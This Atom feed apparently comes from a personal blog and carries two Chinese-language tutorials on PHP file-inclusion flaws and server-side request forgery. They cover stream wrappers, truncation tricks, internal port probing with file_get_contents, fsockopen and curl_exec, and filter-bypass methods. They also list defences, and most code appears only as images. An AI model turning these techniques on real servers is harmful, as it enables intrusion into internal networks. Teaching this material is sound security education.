<?xml version="1.0" encoding="UTF-8"?>
<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
	<title>Baz&#x27;s blog</title>
	<link href="https://baz.ee/atom.xml" rel="self" type="application/atom+xml"/>
  <link href="https://baz.ee"/>
	<generator uri="https://www.getzola.org/">Zola</generator>
	<updated>2021-06-28T00:00:00+00:00</updated>
	<id>https://baz.ee/atom.xml</id>
	<entry xml:lang="en">
		<title>文件包含漏洞</title>
		<published>2021-06-28T00:00:00+00:00</published>
		<updated>2021-06-28T00:00:00+00:00</updated>
		<link href="https://baz.ee/wen-jian-bao-han-lou-dong/" type="text/html"/>
		<id>https://baz.ee/wen-jian-bao-han-lou-dong/</id>
		<content type="html">&lt;h1 id=&quot;shi-yao-shi-wen-jian-bao-han-lou-dong&quot;&gt;什么是文件包含漏洞&lt;&#x2F;h1&gt;
&lt;p&gt;Q：什么是文件包含？&lt;br &#x2F;&gt;A：简单一句话，为了更好地使用代码的&lt;strong&gt;重用性&lt;&#x2F;strong&gt;，引入了文件包含函数，可以通过文件包含函数将文件包含进来，  直接使用包含文件的代码。&lt;&#x2F;p&gt;
&lt;span id=&quot;continue-reading&quot;&gt;&lt;&#x2F;span&gt;
&lt;p&gt;Q：文件包含漏洞的成因是什么？&lt;br &#x2F;&gt;A：在包含文件时候，为了灵活包含文件，将被包含文件设置为变量，通过动态变量来引入需要包含的文件时，&lt;br &#x2F;&gt;用户可以对变量的值可控而服务器端&lt;strong&gt;未对&lt;&#x2F;strong&gt;变量值进行&lt;strong&gt;合理地校验&lt;&#x2F;strong&gt;或者校验被&lt;strong&gt;绕过&lt;&#x2F;strong&gt;，这样就导致了文件包含漏洞。通常 文件包含漏洞出现在PHP语言中。&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624870392581-cfe0fa70-3c16-4cf9-9aa1-e71a9b1f5a99.png#align=left&amp;amp;display=inline&amp;amp;height=133&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=266&amp;amp;originWidth=1630&amp;amp;size=124555&amp;amp;status=done&amp;amp;style=none&amp;amp;width=815&quot; alt=&quot;image.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624870404005-e54ac5c5-09c6-4baf-bbfb-94298a4cf536.png#align=left&amp;amp;display=inline&amp;amp;height=57&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=114&amp;amp;originWidth=828&amp;amp;size=5075&amp;amp;status=done&amp;amp;style=none&amp;amp;width=414&quot; alt=&quot;image.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624870412164-83dce965-6a25-4b5b-9629-c7e5cc689097.png#align=left&amp;amp;display=inline&amp;amp;height=523&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=1046&amp;amp;originWidth=2797&amp;amp;size=622251&amp;amp;status=done&amp;amp;style=none&amp;amp;width=1398.5&quot; alt=&quot;image.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h1 id=&quot;wen-jian-bao-han-han-shu&quot;&gt;文件包含函数&lt;&#x2F;h1&gt;
&lt;ul&gt;
&lt;li&gt;Include:&lt;&#x2F;li&gt;
&lt;li&gt;Include_once:&lt;&#x2F;li&gt;
&lt;li&gt;require&lt;&#x2F;li&gt;
&lt;li&gt;require_once&lt;&#x2F;li&gt;
&lt;li&gt;highlight_file、show_source、readfile、file_get_contents、fopen、file&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h1 id=&quot;wen-jian-bao-han-lou-dong-fen-lei&quot;&gt;文件包含漏洞分类&lt;&#x2F;h1&gt;
&lt;ul&gt;
&lt;li&gt;本地文件包含&lt;&#x2F;li&gt;
&lt;li&gt;远程文件包含&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;allow_url_fopen：为ON时，能读取远程文件，例如file_get_contents()就能读远程文件&lt;br &#x2F;&gt;Allow_url_include：为ON时，就可使用include和require等方式包含远程文件&lt;&#x2F;p&gt;
&lt;h1 id=&quot;wen-jian-bao-han-lou-dong-de-li-yong-fang-shi&quot;&gt;文件包含漏洞的利用方式&lt;&#x2F;h1&gt;
&lt;h2 id=&quot;wei-xie-yi&quot;&gt;伪协议&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624870970241-dab7c251-cb93-4464-8821-8d5e4aad74d2.png#align=left&amp;amp;display=inline&amp;amp;height=321&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=642&amp;amp;originWidth=1740&amp;amp;size=359608&amp;amp;status=done&amp;amp;style=none&amp;amp;width=870&quot; alt=&quot;image.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;php:&#x2F;&#x2F;filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用 data:&#x2F;&#x2F; 同样类似与php:&#x2F;&#x2F;input，可以让用户来控制输入流&lt;br &#x2F;&gt;php:&#x2F;&#x2F;input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行&lt;br &#x2F;&gt;phar:&#x2F;&#x2F;xxx.png&#x2F;shell.php 解压缩包的一个函数，不管后缀是什么，都会当做压缩包来解压。&lt;&#x2F;p&gt;
&lt;h2 id=&quot;qi-ta&quot;&gt;其他&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;00截断&lt;&#x2F;li&gt;
&lt;li&gt;长度截断（Windows：256，Linux：4096）&lt;&#x2F;li&gt;
&lt;li&gt;包含日志文件&lt;&#x2F;li&gt;
&lt;li&gt;包含session&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h1 id=&quot;wen-jian-bao-han-lou-dong-de-fang-yu&quot;&gt;文件包含漏洞的防御&lt;&#x2F;h1&gt;
&lt;ul&gt;
&lt;li&gt;PHP 中使用 open_basedir 配置限制访问在指定的区域&lt;&#x2F;li&gt;
&lt;li&gt;过滤.（点）&#x2F;（反斜杠）\（反斜杠）&lt;&#x2F;li&gt;
&lt;li&gt;禁止服务器远程文件包含&lt;&#x2F;li&gt;
&lt;li&gt;尽量不要使用动态包含，可以在需要包含的页面固定写好&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h1 id=&quot;wen-jian-bao-han-lou-dong-shi-zhan&quot;&gt;文件包含漏洞实战&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1627145504379-33c845bd-ca62-4ada-8b01-add5100f8cff.png#align=left&amp;amp;display=inline&amp;amp;height=520&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=1040&amp;amp;originWidth=1920&amp;amp;size=100648&amp;amp;status=done&amp;amp;style=none&amp;amp;width=960&quot; alt=&quot;image.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;在hackbar中输入&lt;&#x2F;p&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>SSRF服务端请求伪造漏洞</title>
		<published>2021-06-25T00:00:00+00:00</published>
		<updated>2021-06-25T00:00:00+00:00</updated>
		<link href="https://baz.ee/ssrffu-wu-qi-duan-qing-qiu-wei-zao-lou-dong/" type="text/html"/>
		<id>https://baz.ee/ssrffu-wu-qi-duan-qing-qiu-wei-zao-lou-dong/</id>
		<content type="html">&lt;h1 id=&quot;shi-yao-shi-ssrf&quot;&gt;什么是SSRF&lt;&#x2F;h1&gt;
&lt;p&gt;SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由&lt;strong&gt;攻击者构造&lt;&#x2F;strong&gt;形成&lt;strong&gt;由服务端发起&lt;&#x2F;strong&gt;请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够&lt;strong&gt;请求到&lt;&#x2F;strong&gt;与它相连而&lt;strong&gt;与外网隔离的内部系统&lt;&#x2F;strong&gt;）&lt;br &#x2F;&gt;能够对外发送网络请求的点都有可能存在ssrf漏洞&lt;&#x2F;p&gt;
&lt;span id=&quot;continue-reading&quot;&gt;&lt;&#x2F;span&gt;
&lt;p&gt;漏洞成因&lt;br &#x2F;&gt;&lt;a href=&quot;http:&#x2F;&#x2F;www.xxx.com&#x2F;a.php?image=http:&#x2F;&#x2F;192.168.0.109&#x2F;xxx.png&quot;&gt;http:&#x2F;&#x2F;www.xxx.com&#x2F;a.php?image=http:&#x2F;&#x2F;192.168.0.109&#x2F;xxx.png&lt;&#x2F;a&gt;&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624558154091-48f754d2-e6f5-4cf8-a21d-e990fd35ec79.png#align=left&amp;amp;display=inline&amp;amp;height=589&amp;amp;id=NqbdT&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=1177&amp;amp;originWidth=2200&amp;amp;size=1022377&amp;amp;status=done&amp;amp;style=none&amp;amp;width=1100&quot; alt=&quot;image.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;由于业务需要，服务端程序需要从其他服务器应用中获取数据，例如获取图片、数据等，但是由于服务器没有对其请求的目标地址做过滤和限制，导致黑客可以利用此缺陷请求任意服务器资源，其中就包含隐匿在内网的应用。很多企业认为服务器在内网不会受到黑客攻击，便放任漏洞不管，不做补丁修复和版本升级，弱口令遍布内网。但是在SSRF漏洞面前这些漏洞都会成为黑客的“盘中餐”。&lt;br &#x2F;&gt;SSRF漏洞一般为HTTP／HTTPS方式出现，但类似TCP Connect方式也可以探测内网的IP活跃状态和端口的开放情况，但此类危害较小。&lt;&#x2F;p&gt;
&lt;p&gt;SSRF漏洞出现的位置&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;服务器主动发起网络请求，例如HTTP／HTTPS／Socket&lt;&#x2F;li&gt;
&lt;li&gt;分享功能，通过URL分享网页内容，&lt;a href=&quot;https:&#x2F;&#x2F;link.zhihu.com&#x2F;?target=http%3A&#x2F;&#x2F;www.360bug.net&#x2F;index.php&#x2F;archives&#x2F;49&#x2F;%3Ffrom%3Dtimeline%26isappinstalled%3D0&quot;&gt;微博SSRF&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;图片加载、下载功能&lt;&#x2F;li&gt;
&lt;li&gt;邮件系统&lt;&#x2F;li&gt;
&lt;li&gt;api远程调用&lt;&#x2F;li&gt;
&lt;li&gt;只要是服务器可以主动发起网络请求便可能出现&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h1 id=&quot;ssrflou-dong-de-wei-hai&quot;&gt;SSRF漏洞的危害&lt;&#x2F;h1&gt;
&lt;ul&gt;
&lt;li&gt;对目标服务器所在的内网进行IP存活性扫描和端口扫描&lt;&#x2F;li&gt;
&lt;li&gt;利用扫描的指纹信息判断开放的服务，从而对内网的主机进行攻击&lt;&#x2F;li&gt;
&lt;li&gt;识别内网WEB应用指纹，判断应用类型进行攻击&lt;&#x2F;li&gt;
&lt;li&gt;使用特定协议攻击应用（gopher、dict、file、FTP／SFTP等）&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h1 id=&quot;ssrflou-dong-de-ye-wu-chang-jing&quot;&gt;SSRF漏洞的业务场景&lt;&#x2F;h1&gt;
&lt;ul&gt;
&lt;li&gt;分享：通过URL地址分享网页内容&lt;&#x2F;li&gt;
&lt;li&gt;转码服务（手机适配）&lt;&#x2F;li&gt;
&lt;li&gt;在线翻译（百度翻译搜索检索IP的网址：&lt;a href=&quot;http:&#x2F;&#x2F;www.ip.cn&quot;&gt;http:&#x2F;&#x2F;www.ip.cn&lt;&#x2F;a&gt;）&lt;&#x2F;li&gt;
&lt;li&gt;图片加载与下载：通过URL地址加载或下载图片&lt;&#x2F;li&gt;
&lt;li&gt;图片、文章收藏功能&lt;&#x2F;li&gt;
&lt;li&gt;未公开的api实现以及其他调用URL的功能&lt;&#x2F;li&gt;
&lt;li&gt;从URL关键字中寻找（share、wap、url、link、src、source、target、sourceURl、 imageURL、domain）&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ol&gt;
&lt;li&gt;图片加载与下载&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624558913214-24d93aa8-d7de-4dd6-a007-93fc3a37dcc1.png#align=left&amp;amp;display=inline&amp;amp;height=736&amp;amp;id=gVCGs&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=736&amp;amp;originWidth=1504&amp;amp;size=656515&amp;amp;status=done&amp;amp;style=none&amp;amp;width=1504&quot; alt=&quot;image.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;分享：通过URL地址分享网页内容&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624558913791-ecfca080-ed2c-442b-96e1-e255cc3e200a.png#align=left&amp;amp;display=inline&amp;amp;height=399&amp;amp;id=d7Fbc&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=798&amp;amp;originWidth=1478&amp;amp;size=602333&amp;amp;status=done&amp;amp;style=none&amp;amp;width=739&quot; alt=&quot;image.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;ol start=&quot;3&quot;&gt;
&lt;li&gt;翻译：百度翻译功能会请求ip138，此时ip138便能查询出百度翻译服务器的外网IP&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624558955388-123a425f-b931-4be1-a709-d0847c0d4154.png#align=left&amp;amp;display=inline&amp;amp;height=395&amp;amp;id=AtyCw&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=790&amp;amp;originWidth=1374&amp;amp;size=863962&amp;amp;status=done&amp;amp;style=none&amp;amp;width=687&quot; alt=&quot;image.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h1 id=&quot;yin-fa-ssrflou-dong-de-han-shu&quot;&gt;引发SSRF漏洞的函数&lt;&#x2F;h1&gt;
&lt;ul&gt;
&lt;li&gt;file_get_contents()&lt;&#x2F;li&gt;
&lt;li&gt;fsockopen()&lt;&#x2F;li&gt;
&lt;li&gt;curl_exec()&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;strong&gt;file_get_contents()&lt;&#x2F;strong&gt;&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624558338105-294f2372-ce5b-4137-86a3-909404c71172.png#align=left&amp;amp;display=inline&amp;amp;height=230&amp;amp;id=TsGsW&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=460&amp;amp;originWidth=866&amp;amp;size=49238&amp;amp;status=done&amp;amp;style=none&amp;amp;width=433&quot; alt=&quot;image.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;以上代码是获取post参数url中的值地址，通过file_get_contents获取url中的图片内容，保存到image目录下，然后显示。&lt;br &#x2F;&gt;file_get_contents函数使用前需要将php.ini的allow_url_fopen设置为ON。&lt;br &#x2F;&gt;以上的漏洞代码是存在SSRF漏洞的，可以控制url参数，自定义任意的URL，包括内网的URL，例如现在验证内网192.168.0.118是否开启了6379端口，可以做以下访问&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624558366722-a14292a6-8f94-4a09-951c-8fd867a6c00b.png#align=left&amp;amp;display=inline&amp;amp;height=186&amp;amp;id=zrPpH&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=372&amp;amp;originWidth=1914&amp;amp;size=169774&amp;amp;status=done&amp;amp;style=none&amp;amp;width=957&quot; alt=&quot;image.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;根据上图提示说明开启了6379，接下来测试是否开启了8888端口&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624558473996-749d2b12-3c10-4a9c-9be9-c07dabc40489.png#align=left&amp;amp;display=inline&amp;amp;height=164&amp;amp;id=z5vBN&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=328&amp;amp;originWidth=1466&amp;amp;size=105648&amp;amp;status=done&amp;amp;style=none&amp;amp;width=733&quot; alt=&quot;image.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;测试8888端口时，根据上图提示，显示错误信息，说明端口未开放。接下来测试80端口，看显示结果（因为109的80端口是开放的，所以测试下，看回显内容）&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624611964815-95164369-c3de-4d42-983a-f7b055b31990.png#align=left&amp;amp;display=inline&amp;amp;height=216&amp;amp;id=LBRdM&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=432&amp;amp;originWidth=1184&amp;amp;size=86715&amp;amp;status=done&amp;amp;style=none&amp;amp;width=592&quot; alt=&quot;image.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;访问109的80端口并未报错，此时，查看图片内容（选中图片，点复制链接），如下图：&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624612001640-30c1b72d-b3b0-4c7e-9a6d-856af69ad9f8.png#align=left&amp;amp;display=inline&amp;amp;height=381&amp;amp;id=CGAE3&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=762&amp;amp;originWidth=1712&amp;amp;size=207894&amp;amp;status=done&amp;amp;style=none&amp;amp;width=856&quot; alt=&quot;image.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;发现请求的80端口的数据被写入到了图片问题中，符合代码预期。除了可以探测端口，也可以做文件包含漏洞的利用，这里不再细说文件包含的知识。&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;fsockopen()&lt;&#x2F;strong&gt;&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624558599883-18beb195-037a-4c4b-a182-be73d11365bd.png#align=left&amp;amp;display=inline&amp;amp;height=431&amp;amp;id=cLTdq&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=862&amp;amp;originWidth=1518&amp;amp;size=126360&amp;amp;status=done&amp;amp;style=none&amp;amp;width=759&quot; alt=&quot;image.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;以上函数是接受url和port来制定socket访问的地址和端口，由于地址和端口用户可控，所以可以用来SSRF漏洞的利用。&lt;br &#x2F;&gt;例如可以做以下访问可以探测119的3306端口是否开放：&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624558630672-9214aeb2-a4ae-43cc-8ebc-5228e42454d9.png#align=left&amp;amp;display=inline&amp;amp;height=384&amp;amp;id=K7MSU&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=384&amp;amp;originWidth=1676&amp;amp;size=260029&amp;amp;status=done&amp;amp;style=none&amp;amp;width=1676&quot; alt=&quot;image.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;做以下访问可以探测109的3306是否开放：&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624558631019-9fc710ba-d52f-46f6-8040-dbcd346ef87f.png#align=left&amp;amp;display=inline&amp;amp;height=147&amp;amp;id=xCvAB&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=294&amp;amp;originWidth=1544&amp;amp;size=78865&amp;amp;status=done&amp;amp;style=none&amp;amp;width=772&quot; alt=&quot;image.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;未出现错误信息说明端口开放&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;curl_exec()&lt;&#x2F;strong&gt;&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624558683676-240f8f92-6cd6-4c31-9d30-7d964a23c1ce.png#align=left&amp;amp;display=inline&amp;amp;height=206&amp;amp;id=UygUV&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=412&amp;amp;originWidth=1044&amp;amp;size=44782&amp;amp;status=done&amp;amp;style=none&amp;amp;width=522&quot; alt=&quot;image.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;curl_exec函数是危害最大的函数，也是需要重点讲的函数。以上代码是获取参数url的值，使用curl进行访问。&lt;br &#x2F;&gt;curl_exec的使用需要3个条件：&lt;br &#x2F;&gt;1、PHP版本&amp;gt;=5.3&lt;br &#x2F;&gt;2、开启extension=php_curl.dll&lt;br &#x2F;&gt;3、--wite-curlwrappers（编译PHP时用，此时不需要，可忽略）&lt;br &#x2F;&gt;使用dict协议探测22端口（后面会讲dict协议）&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624558696648-b7dd19d4-56e0-4f9c-812b-ef79a0b0a941.png#align=left&amp;amp;display=inline&amp;amp;height=78&amp;amp;id=xbT0I&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=156&amp;amp;originWidth=1538&amp;amp;size=89120&amp;amp;status=done&amp;amp;style=none&amp;amp;width=769&quot; alt=&quot;image.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;使用dict协议探测6379端口&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624558717469-21f223fa-bbad-4257-895a-ff41da8487f1.png#align=left&amp;amp;display=inline&amp;amp;height=69&amp;amp;id=JABwP&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=138&amp;amp;originWidth=1538&amp;amp;size=94799&amp;amp;status=done&amp;amp;style=none&amp;amp;width=769&quot; alt=&quot;image.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;可以根据回显的banner信息判断目标端口运行的服务为ssh和redis服务，dict协议还可以做到执行命令的功能。&lt;&#x2F;p&gt;
&lt;h1 id=&quot;ssrflou-dong-rao-guo-fang-shi&quot;&gt;SSRF漏洞绕过方式&lt;&#x2F;h1&gt;
&lt;ul&gt;
&lt;li&gt;攻击本机&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624559049882-552d20c3-874a-4878-bad3-9c9947ca3945.png#align=left&amp;amp;display=inline&amp;amp;height=77&amp;amp;id=nMviQ&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=154&amp;amp;originWidth=1512&amp;amp;size=113423&amp;amp;status=done&amp;amp;style=none&amp;amp;width=756&quot; alt=&quot;image.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;利用@绕过&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624559057665-808386a7-5ee1-431e-8757-746854f6dd73.png#align=left&amp;amp;display=inline&amp;amp;height=85&amp;amp;id=nUwn9&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=170&amp;amp;originWidth=1512&amp;amp;size=187252&amp;amp;status=done&amp;amp;style=none&amp;amp;width=756&quot; alt=&quot;image.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;利用短地址绕过&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624559065931-3871dc73-c9d1-4d94-817b-40655176ddbc.png#align=left&amp;amp;display=inline&amp;amp;height=81&amp;amp;id=taNXG&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=162&amp;amp;originWidth=1512&amp;amp;size=296348&amp;amp;status=done&amp;amp;style=none&amp;amp;width=756&quot; alt=&quot;image.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;利用Enclosed alphanumerics&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624559093589-462bc619-3f79-4656-8d1e-c7ce427fda80.png#align=left&amp;amp;display=inline&amp;amp;height=273&amp;amp;id=as2CK&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=546&amp;amp;originWidth=1472&amp;amp;size=896056&amp;amp;status=done&amp;amp;style=none&amp;amp;width=736&quot; alt=&quot;image.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;利用句号代替点绕过&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624559107978-f481f39a-6741-4e66-9763-3a628bb8ec52.png#align=left&amp;amp;display=inline&amp;amp;height=46&amp;amp;id=A4d71&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=92&amp;amp;originWidth=1104&amp;amp;size=22124&amp;amp;status=done&amp;amp;style=none&amp;amp;width=552&quot; alt=&quot;image.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;特殊域名绕过&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624559126327-adefa8ec-d253-4535-b471-d23d093c949b.png#align=left&amp;amp;display=inline&amp;amp;height=67&amp;amp;id=XJOit&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=134&amp;amp;originWidth=1104&amp;amp;size=102307&amp;amp;status=done&amp;amp;style=none&amp;amp;width=552&quot; alt=&quot;image.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;使用进制绕过，例如127.0.0.1&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624559148740-0c7bf54c-4421-45ea-92f7-f988a776498d.png#align=left&amp;amp;display=inline&amp;amp;height=172&amp;amp;id=y7bel&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=344&amp;amp;originWidth=1506&amp;amp;size=570210&amp;amp;status=done&amp;amp;style=none&amp;amp;width=753&quot; alt=&quot;image.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
